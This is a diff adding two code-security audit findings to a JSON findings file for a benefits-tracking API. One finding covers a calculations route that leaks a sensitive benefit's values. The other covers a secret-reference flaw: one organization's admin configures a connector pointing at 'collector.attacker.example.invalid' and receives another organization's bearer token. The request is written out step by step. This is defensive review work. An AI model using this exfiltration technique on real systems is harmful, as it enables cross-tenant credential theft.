@@ -1,0 +1,65 @@
+{
+  "schema_version": 1,
+  "findings": [
+    {
+      "id": "F-DG6-180",
+      "stage_id": "DG6",
+      "requirement": "REQ-S10-002",
+      "severity": "High",
+      "mandatory_violation": true,
+      "title": "The formula calculation lineage of a sensitive benefit's measurements is listed to readers who get 404 on the benefit: GET /api/v1/benefit-formulas/{formulaId}/versions/{n}/calculations returns the measurement's inputs and result (its individual value) on transformation.read alone",
+      "reproduction": "Cause: a measurement computed with formulaVersionId inserts a benefit_calculation row carrying the inputs and the result, i.e. the measured amount (apps/api/src/modules/benefits/measurements.ts:478-500, linked by benefit_measurement.benefit_calculation_id, 0038). The list route apps/api/src/modules/kpi/calculations.ts:249-279 checks only transformation.read on the formula's transformation and returns every benefit_calculation of the version (toBenefitCalculation: inputs, result, period, computedBy); it never applies the ADR-0051 §2 clause, and benefit_calculation is not among SENSITIVE_CHILD_SOURCES (apps/api/src/modules/access/sensitive-reach.ts:88-136), so neither the T-DG6-BE-Y1 helper nor the route guard covers it. Reproduction on the migrated, demo-seeded dataset (synthetic), disposable PostgreSQL, candidate cf40705b (source 9bb2207): docs/delivery/test-evidence/DG6/code-security/round-2/repro/zz-cs-r2-sens-reach.test.ts, test 'P-CALC', run by `checks.sh repro 40-repro-sens-reach zz-cs-r2-sens-reach.test.ts` (log 40-repro-sens-reach.log; also in the attempt1 log). 1. A TL of the demo transformation (no grant, not a named party) lists GET /api/v1/benefit-formulas/01995000-4301-7000-8000-000000000003/versions/1/calculations: 200, 1 item. 2. A TO (sensitive_record.grant) marks the formula-backed demo benefit 01995000-4401-7000-8000-000000000003 sensitive: 200. 3. The TL now gets 404 on GET /api/v1/transformations/{t}/benefits/01995000-4401-7000-8000-000000000003 (as ADR-0051 §2 requires). 4. The same TL lists the same calculations again: 200 with calculation 01995000-4304-7000-8000-000000000002, whose result 80000.000000 equals the benefit's measured amount 80000.0000, with its full inputs (roaming_data_mb 80000000, baseline_cost_per_mb 0.012 SAR, measured_cost_per_mb, ...). The probe asserts the correct behaviour (the row is absent) and fails on it: 'expected { ...(18) } to be undefined'. The same applies to a formula-computed business-case line of a sensitive business case if its lineage is stored in the same table (not separately reproduced).",
+      "expected": "REQ-S10-002 ('a sensitive benefit is hidden from a workstream member without the grant') and ADR-0051 §2 ('the record and its individual value are never shown'; 'Lists, search, exports, assistant retrieval: the row is absent'): for a caller not admitted to a sensitive benefit (or business case), the calculations list omits the lineage rows of its measurements (or lines), e.g. by mapping benefit_calculation to its measurement's benefit through benefit_measurement.benefit_calculation_id in the shared sensitive-reach helper and filtering the list with withoutRestricted; any single-calculation read answers 404.",
+      "actual": "After the marking the TL gets 404 on the benefit but still reads its measurement's calculation, result 80000.000000 (= the measured amount) and every input, through GET /api/v1/benefit-formulas/{formulaId}/versions/1/calculations (200).",
+      "evidence": [
+        "docs/delivery/test-evidence/DG6/code-security/round-2/40-repro-sens-reach.log",
+        "docs/delivery/test-evidence/DG6/code-security/round-2/40-repro-sens-reach.attempt1.log",
+        "docs/delivery/test-evidence/DG6/code-security/round-2/repro/zz-cs-r2-sens-reach.test.ts",
+        "apps/api/src/modules/kpi/calculations.ts",
+        "apps/api/src/modules/benefits/measurements.ts",
+        "apps/api/src/modules/access/sensitive-reach.ts"
+      ],
+      "reported_by": "code-security-reviewer",
+      "reported_in": "docs/delivery/reviews/DG6/round-2/code-security-reviewer.json",
+      "owner": "kpi-benefits-engineer",
+      "status": "OPEN",
+      "history": [
+        {
+          "at": "2026-11-02T10:05:00Z",
+          "status": "OPEN",
+          "note": "Raised in DG6 round 2 by code-security-reviewer; reproduced twice on the demo dataset against candidate cf40705b (source 9bb2207), while re-verifying F-DG6-121..123."
+        }
+      ]
+    },
+    {
+      "id": "F-DG6-181",
+      "stage_id": "DG6",
+      "requirement": "REQ-S16-029",
+      "severity": "High",
+      "mandatory_violation": true,
+      "title": "A SecretRef is bound to neither its setting nor its organization: an ADM_TECH of organization A can name the MTH_SECRET_* secret IT provisioned for organization B's connector (or the installation's S3 key, SMTP password, assistant key, a webhook signing secret) in an organization-A connector and have the API send it to a host of their choice",
+      "reproduction": "Cause: after the F-DG6-120 repair the env provider resolves any MTH_SECRET_<NAME> for any consumer (apps/api/src/modules/platform/secrets.ts:101 ENV_SECRET_NAME, :111-115 secretRefInNamespace, :140), and the write-time check (apps/api/src/modules/integrations/connectors.ts:302-303 assertSecretRefInNamespace) tests the name's shape only. Nothing records which setting or organization a secret was provisioned for, so ADR-0052 §5's 'a SecretRef names a secret IT holds for this setting' is not enforced. The http_pull adapter sends the bearer value to the configured endpointUrl (apps/api/src/modules/integrations/adapters/http-pull.ts:118), whose only rule is https plus a host (connectors.ts:76; no egress allow-list). The stored reference's `resolvable` flag (credentialRefViews) also tells the caller whether a guessed MTH_SECRET_* name exists. Reproduction (real API, real env provider, disposable PostgreSQL, candidate cf40705b, source 9bb2207; only the network transport is a recorder): docs/delivery/test-evidence/DG6/code-security/round-2/repro/zz-cs-r2-secret-cross-org.test.ts, run by `checks.sh repro 42-probe-secret-cross-org zz-cs-r2-secret-cross-org.test.ts` (log 42-probe-secret-cross-org.log). With MTH_SECRET_CS_R2_ORGB_ERP_TOKEN set in the API's environment (as IT provisions a secret for organization B's ERP connector): 1. organization B's ADM_TECH creates B's connector naming it: 201, resolvable true. 2. Organization A's ADM_TECH (ADM_TECH and ADM_ACCESS at organization A only) gets 404 on B's connector. 3. The same A admin POSTs /api/v1/admin/connectors {organizationId: A, adapterKind: http_pull, endpointUrl: https://collector.attacker.example.invalid/x, credentialRefs: {bearer: {provider: env, name: MTH_SECRET_CS_R2_ORGB_ERP_TOKEN}}}: 201, resolvable true. 4. POST .../{id}/test: 200 succeeded, and the recorder captured 'Bearer synthetic-orgb-erp-token-cs-r2-e3f1' sent to the attacker host. The probe asserts the correct behaviour (B's secret never leaves for A's connector) and fails on it. The same path yields the raw S3 secret access key of the installation-wide evidence store (storage settings send only SigV4 signatures, never the key), which gives direct bucket access to every organization's evidence, including sensitive items, outside the application's authorization.",
+      "expected": "ADR-0052 §5 ('a SecretRef names a secret IT holds for this setting'), REQ-S16-029 ('never expose secrets'; 'a job's identity cannot read records outside its scope') and organization scoping (REQ-S10-004): a configured reference resolves only a secret provisioned for that consumer and organization. For example: an IT-maintained binding (configuration or a table only IT changes) from each MTH_SECRET_* name to the consumers and organizations allowed to use it, checked at write time (400 validation.secret_ref_namespace, or a dedicated code, with the same answer whether the secret exists) and again at resolve time; or a per-consumer, per-organization prefix (e.g. MTH_SECRET_CONNECTOR_<ORGCODE>_*, MTH_SECRET_STORAGE_*, MTH_SECRET_SMTP_*, MTH_SECRET_ASSISTANT_*, MTH_SECRET_WEBHOOK_<ORGCODE>_*) enforced per consumer. Optionally an egress host allow-list for connector endpoints.",
+      "actual": "Organization A's ADM_TECH, who cannot see organization B's connector (404), creates an organization-A connector naming B's secret (201, resolvable true) and the connector test sends 'Authorization: Bearer <B's token>' to the host A chose.",
+      "evidence": [
+        "docs/delivery/test-evidence/DG6/code-security/round-2/42-probe-secret-cross-org.log",
+        "docs/delivery/test-evidence/DG6/code-security/round-2/repro/zz-cs-r2-secret-cross-org.test.ts",
+        "apps/api/src/modules/platform/secrets.ts",
+        "apps/api/src/modules/integrations/connectors.ts",
+        "apps/api/src/modules/integrations/adapters/http-pull.ts",
+        "docs/architecture/adr/ADR-0052-p6-request-input-hardening-uploads-preview-secrets-audit-api-sweeps.md"
+      ],
+      "reported_by": "code-security-reviewer",
+      "reported_in": "docs/delivery/reviews/DG6/round-2/code-security-reviewer.json",
+      "owner": "backend-workflow-engineer",
+      "status": "OPEN",
+      "history": [
+        {
+          "at": "2026-11-02T10:10:00Z",
+          "status": "OPEN",
+          "note": "Raised in DG6 round 2 by code-security-reviewer while re-verifying F-DG6-120 (which is closed as raised); reproduced end to end against candidate cf40705b (source 9bb2207)."
+        }
+      ]
+    }
+  ]
+}
